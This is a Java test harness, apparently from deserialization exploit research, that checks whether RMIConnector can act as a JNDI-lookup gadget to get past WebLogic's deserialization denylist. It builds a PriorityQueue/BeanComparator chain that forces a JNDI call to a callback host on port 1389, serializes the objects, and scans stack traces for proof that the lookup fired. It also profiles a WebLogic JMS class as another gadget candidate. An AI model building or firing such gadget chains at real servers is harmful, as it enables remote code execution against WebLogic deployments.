import java.io.*;
import java.lang.reflect.*;
import java.util.*;
import javax.management.remote.*;
import javax.management.remote.rmi.*;

/**
 * Test RMIConnector as JNDI sink alternative to JdbcRowSetImpl.
 *
 * RMIConnector is Serializable and NOT on WebLogic denylist.
 * If getMBeanServerConnection() or getConnectionId() triggers connect(),
 * and connect() does JNDI lookup, we have an alternative sink.
 *
 * Chain: PQ -> BeanComparator("connectionId"|"MBeanServerConnection")
 *   -> RMIConnector.getConnectionId()/getMBeanServerConnection()
 *   -> connect() -> findRMIServerJNDI() -> JNDI lookup
 */
public class RMIConnectorTest {
    public static void main(String[] args) throws Exception {
        String callback = args.length > 0 ? args[0] : "service:jmx:rmi:///jndi/rmi://host.docker.internal:1389/RMI_CONN";
        System.out.println("=== RMIConnector as JNDI Sink ===\n");

        // Step 1: Check RMIConnector internals
        System.out.println("--- RMIConnector Analysis ---");
        Class<?> rmiConnClass = RMIConnector.class;
        System.out.println("Serializable: " + Serializable.class.isAssignableFrom(rmiConnClass));

        // List all fields
        System.out.println("\nFields:");
        for (Field f : rmiConnClass.getDeclaredFields()) {
            f.setAccessible(true);
            int mods = f.getModifiers();
            String modStr = "";
            if (Modifier.isStatic(mods)) modStr += "static ";
            if (Modifier.isTransient(mods)) modStr += "transient ";
            if (Modifier.isFinal(mods)) modStr += "final ";
            System.out.println("  " + modStr + f.getType().getSimpleName() + " " + f.getName());
        }

        // List zero-arg getters
        System.out.println("\nZero-arg getters:");
        for (Method m : rmiConnClass.getMethods()) {
            if (m.getName().startsWith("get") && m.getParameterCount() == 0
                && !m.getDeclaringClass().equals(Object.class)) {
                System.out.println("  " + m.getReturnType().getSimpleName() + " " + m.getName() + "()");
            }
        }

        // Step 2: Create RMIConnector with JNDI URL
        System.out.println("\n--- Test RMIConnector with JNDI URL ---");
        try {
            JMXServiceURL serviceURL = new JMXServiceURL(callback);
            System.out.println("JMXServiceURL: " + serviceURL);

            RMIConnector connector = new RMIConnector(serviceURL, null);
            System.out.println("RMIConnector created");

            // Check if it's serializable
            System.out.println("\nSerialization test...");
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(bos);
            try {
                oos.writeObject(connector);
                oos.close();
                System.out.println("Serialized: " + bos.size() + " bytes");
            } catch (NotSerializableException e) {
                System.out.println("NOT SERIALIZABLE: " + e.getMessage());
            }

            // Test: call getConnectionId() directly
            System.out.println("\nCalling getConnectionId()...");
            try {
                String connId = connector.getConnectionId();
                System.out.println("ConnectionId: " + connId);
            } catch (Throwable e) {
                System.out.println("Exception: " + e.getClass().getName() + ": " + trunc(e.getMessage()));
                checkJndi(e);
            }

            // Test: call getMBeanServerConnection()
            System.out.println("\nCalling getMBeanServerConnection()...");
            try {
                Object mbs = connector.getMBeanServerConnection();
                System.out.println("MBeanServerConnection: " + mbs);
            } catch (Throwable e) {
                System.out.println("Exception: " + e.getClass().getName() + ": " + trunc(e.getMessage()));
                checkJndi(e);
            }

            // Test: call connect()
            System.out.println("\nCalling connect()...");
            try {
                connector.connect();
                System.out.println("Connected!");
            } catch (Throwable e) {
                System.out.println("Exception: " + e.getClass().getName() + ": " + trunc(e.getMessage()));
                checkJndi(e);
            }

        } catch (Exception e) {
            System.out.println("Error creating RMIConnector: " + e);
        }

        // Step 3: Test with BeanComparator
        System.out.println("\n\n--- BeanComparator + RMIConnector ---");
        try {
            JMXServiceURL serviceURL = new JMXServiceURL(callback);
            RMIConnector conn1 = new RMIConnector(serviceURL, null);
            RMIConnector conn2 = new RMIConnector(serviceURL, null);

            Class<?> beanCompClass = Class.forName("org.apache.commons.beanutils.BeanComparator");

            // Try different properties
            String[] properties = {"connectionId", "address"};
            for (String prop : properties) {
                System.out.println("\nBeanComparator('" + prop + "').compare(RMIConnector, RMIConnector):");
                Object beanComp = beanCompClass.getDeclaredConstructor(String.class).newInstance(prop);
                Comparator comp = (Comparator) beanComp;
                try {
                    comp.compare(conn1, conn2);
                    System.out.println("  Returned normally");
                } catch (Throwable e) {
                    System.out.println("  Exception: " + e.getClass().getSimpleName() + ": " + trunc(e.getMessage()));
                    checkJndi(e);
                }
            }
        } catch (Exception e) {
            System.out.println("Error: " + e);
        }

        // Step 4: Check DestinationImpl as another candidate
        System.out.println("\n\n--- DestinationImpl (weblogic.jms) ---");
        try {
            Class<?> destClass = Class.forName("weblogic.jms.common.DestinationImpl");
            System.out.println("Serializable: " + Serializable.class.isAssignableFrom(destClass));
            System.out.println("\nZero-arg getters:");
            for (Method m : destClass.getMethods()) {
                if (m.getName().startsWith("get") && m.getParameterCount() == 0) {
                    System.out.println("  " + m.getReturnType().getSimpleName() + " " + m.getName() + "()");
                }
            }
            // Check fields
            System.out.println("\nKey fields:");
            for (Field f : destClass.getDeclaredFields()) {
                f.setAccessible(true);
                String name = f.getName().toLowerCase();
                if (name.contains("jndi") || name.contains("connect") || name.contains("url")
                    || name.contains("name") || name.contains("factory")) {
                    int mods = f.getModifiers();
                    String trans = Modifier.isTransient(mods) ? "TRANSIENT " : "";
                    System.out.println("  " + trans + f.getType().getSimpleName() + " " + f.getName());
                }
            }
        } catch (ClassNotFoundException e) {
            System.out.println("NOT FOUND");
        } catch (NoClassDefFoundError e) {
            System.out.println("ClassDefError: " + e.getMessage());
        }
    }

    static void checkJndi(Throwable e) {
        StringWriter sw = new StringWriter();
        e.printStackTrace(new PrintWriter(sw));
        String trace = sw.toString();
        boolean jndi = trace.contains("javax.naming") || trace.contains("JNDI")
            || trace.contains("lookup") || trace.contains("Connection refused")
            || trace.contains("findRMIServer") || trace.contains("InitialContext");
        if (jndi) {
            System.out.println("  *** JNDI/CONNECT EVIDENCE ***");
            for (String line : trace.split("\n")) {
                String l = line.toLowerCase();
                if (l.contains("connect") || l.contains("jndi") || l.contains("naming")
                    || l.contains("lookup") || l.contains("findrmi") || l.contains("refused")) {
                    System.out.println("    " + line.trim());
                }
            }
        }
    }

    static String trunc(String s) {
        if (s == null) return "null";
        return s.length() > 200 ? s.substring(0, 200) + "..." : s;
    }
}
